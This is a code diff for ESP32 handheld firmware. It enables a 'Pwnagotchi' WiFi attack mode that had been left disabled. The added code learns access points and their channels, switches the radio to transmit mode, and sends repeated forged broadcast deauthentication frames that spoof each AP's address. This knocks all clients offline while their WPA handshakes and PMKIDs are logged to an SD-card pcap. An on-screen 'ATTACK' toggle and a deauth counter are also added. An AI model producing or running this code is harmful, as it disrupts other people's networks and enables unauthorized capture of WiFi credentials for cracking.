@@ -16,16 +16,20 @@
 extern TFT_eSPI tft;
 extern bool feature_exit_requested;
 bool featureExitButtonPressed();
+bool isButtonPressedEdge(int buttonPin);
 
 namespace Pwnagotchi {
 
 static volatile uint32_t s_eapol = 0;     // EAPOL frames seen (handshake msgs)
 static volatile uint32_t s_pmkid = 0;     // EAPOL M1 frames carrying a PMKID
 static volatile uint32_t s_packets = 0;   // all frames seen
+static uint32_t s_deauths = 0;            // deauth frames sent (active mode)
 static uint8_t  s_channel = 1;
+static bool     s_active = true;          // active (deauth-assist) vs passive
 
-// learned AP BSSIDs (from beacons) to target with deauth
+// learned AP BSSIDs (from beacons) + the channel each was seen on, to target deauth
 static uint8_t  s_bssids[32][6];
+static uint8_t  s_bssidChan[32];
 static uint8_t  s_bssidCount = 0;
 
 // SD pcap
@@ -48,10 +52,10 @@ static void pcapWriteFrame(const uint8_t* buf, uint16_t len) {
   s_pcap.write(buf, len);
 }
 
-static void learnBssid(const uint8_t* b) {
+static void learnBssid(const uint8_t* b, uint8_t chan) {
   for (uint8_t i = 0; i < s_bssidCount; i++)
-    if (memcmp(s_bssids[i], b, 6) == 0) return;
-  if (s_bssidCount < 32) { memcpy(s_bssids[s_bssidCount++], b, 6); }
+    if (memcmp(s_bssids[i], b, 6) == 0) { s_bssidChan[i] = chan; return; }
+  if (s_bssidCount < 32) { memcpy(s_bssids[s_bssidCount], b, 6); s_bssidChan[s_bssidCount] = chan; s_bssidCount++; }
 }
 
 // ---- promiscuous RX: detect EAPOL + learn beacon BSSIDs ----
@@ -65,8 +69,8 @@ static void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
   const uint8_t ftype = (fr[0] >> 2) & 0x3;   // 0 mgmt, 1 ctrl, 2 data
   const uint8_t fsub  = (fr[0] >> 4) & 0xF;
 
-  if (ftype == 0 && fsub == 8) {              // beacon -> learn BSSID (addr3)
-    learnBssid(fr + 16);
+  if (ftype == 0 && fsub == 8) {              // beacon -> learn BSSID (addr3) + channel
+    learnBssid(fr + 16, p->rx_ctrl.channel);
     return;
   }
   if (ftype != 2) return;                     // only data frames carry EAPOL
@@ -97,22 +101,40 @@ static void IRAM_ATTR snifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
   }
 }
 
-// ---- broadcast deauth toward learned BSSIDs on the current channel ----
-static void nudgeDeauth() {
+// ---- active deauth-assist: elicit handshakes from APs on the current channel ----
+// Raw RX needs MODE_NULL but raw TX needs a started STA interface, so briefly switch
+// to STA for the burst, then restore NULL + promiscuous. Only targets APs we learned
+// on the current channel (a deauth only reaches its AP's channel).
+static void deauthBurst() {
   if (s_bssidCount == 0) return;
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_mode(WIFI_MODE_STA);
+  esp_wifi_start();
+  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
+
   uint8_t pkt[26] = {
       0xC0, 0x00, 0x00, 0x00,                         // deauth
-      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // dst broadcast
+      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // dst = broadcast (all clients)
       0,0,0,0,0,0,                                    // src = bssid
       0,0,0,0,0,0,                                    // bssid
       0x00, 0x00,                                     // seq
-      0x07, 0x00 };                                   // reason
+      0x07, 0x00 };                                   // reason: class-3 from non-assoc
   for (uint8_t i = 0; i < s_bssidCount; i++) {
+    if (s_bssidChan[i] != s_channel) continue;
     memcpy(pkt + 10, s_bssids[i], 6);
     memcpy(pkt + 16, s_bssids[i], 6);
-    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
-    delay(1);
+    for (int r = 0; r < 3; r++) {                     // a few bursts per AP
+      esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
+      s_deauths++;
+      delay(1);
+    }
   }
+
+  // back to monitor: MODE_NULL + promiscuous on the same channel
+  esp_wifi_set_mode(WIFI_MODE_NULL);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
 }
 
 // ---- pixel face ----
@@ -132,16 +154,22 @@ static void drawStats() {
   tft.setTextFont(1);
   tft.setTextSize(1);
   tft.fillRect(0, 150, tft.width(), 90, UI_BG);
-  char l[40];
-  snprintf(l, sizeof(l), "CH %-2d   APs %d", s_channel, s_bssidCount);
-  tft.drawCentreString(l, tft.width() / 2, 160, 1);
+  char l[48];
+  snprintf(l, sizeof(l), "CH %-2d  APs %d  %s", s_channel, s_bssidCount,
+           s_active ? "ATTACK" : "passive");
+  tft.setTextColor(s_active ? UI_WARN : UI_TEXT, UI_BG);
+  tft.drawCentreString(l, tft.width() / 2, 158, 1);
   tft.setTextSize(2);
   tft.setTextColor(UI_ICON, UI_BG);
   snprintf(l, sizeof(l), "HS %lu", (unsigned long)s_eapol);
-  tft.drawCentreString(l, tft.width() / 2, 180, 1);
+  tft.drawCentreString(l, tft.width() / 2, 176, 1);
   snprintf(l, sizeof(l), "PMKID %lu", (unsigned long)s_pmkid);
   tft.setTextColor(UI_OK, UI_BG);
-  tft.drawCentreString(l, tft.width() / 2, 205, 1);
+  tft.drawCentreString(l, tft.width() / 2, 200, 1);
+  tft.setTextSize(1);
+  tft.setTextColor(UI_TEXT, UI_BG);
+  snprintf(l, sizeof(l), "deauth %lu   UP=mode", (unsigned long)s_deauths);
+  tft.drawCentreString(l, tft.width() / 2, 226, 1);
 }
 
 void run() {
@@ -149,7 +177,7 @@ void run() {
   // clobber our promiscuous mode (without this the sniffer sees 0 packets).
   pauseBackgroundRadioTasks();
 
-  s_eapol = s_pmkid = s_packets = 0;
+  s_eapol = s_pmkid = s_packets = s_deauths = 0;
   s_bssidCount = 0;
   s_channel = 1;
 
@@ -201,11 +229,11 @@ void run() {
       esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
       lastHop = now;
     }
-    // Active deauth needs a TX interface (STA/AP) but raw-frame RX needs MODE_NULL;
-    // doing it here would require thrashing the mode each burst. Passive harvest
-    // (PMKID from AP M1 on client assoc + opportunistic handshakes) works as-is.
-    // nudgeDeauth();  // TODO: mode-switch deauth assist
-    (void)lastDeauth;
+    // toggle active/passive with UP
+    if (isButtonPressedEdge(BTN_UP)) s_active = !s_active;
+
+    // active mode: deauth-assist burst on the current channel (~1.5s cadence)
+    if (s_active && now - lastDeauth > 1500) { deauthBurst(); lastDeauth = now; }
 
     // redraw ~3 Hz; face reacts to recent captures
     if (now - lastDraw > 300) {
@@ -220,9 +248,10 @@ void run() {
 
     // periodic serial log (debug visibility)
     if (now - lastLog > 2000) {
-      Serial.printf("[pwn] ch=%d aps=%d pkts=%lu eapol=%lu pmkid=%lu heap=%u\n", s_channel,
-                    s_bssidCount, (unsigned long)s_packets, (unsigned long)s_eapol,
-                    (unsigned long)s_pmkid, ESP.getFreeHeap());
+      Serial.printf("[pwn] %s ch=%d aps=%d pkts=%lu eapol=%lu pmkid=%lu deauth=%lu heap=%u\n",
+                    s_active ? "ATTACK" : "passive", s_channel, s_bssidCount,
+                    (unsigned long)s_packets, (unsigned long)s_eapol, (unsigned long)s_pmkid,
+                    (unsigned long)s_deauths, ESP.getFreeHeap());
       if (s_pcapOpen) s_pcap.flush();
       lastLog = now;
     }
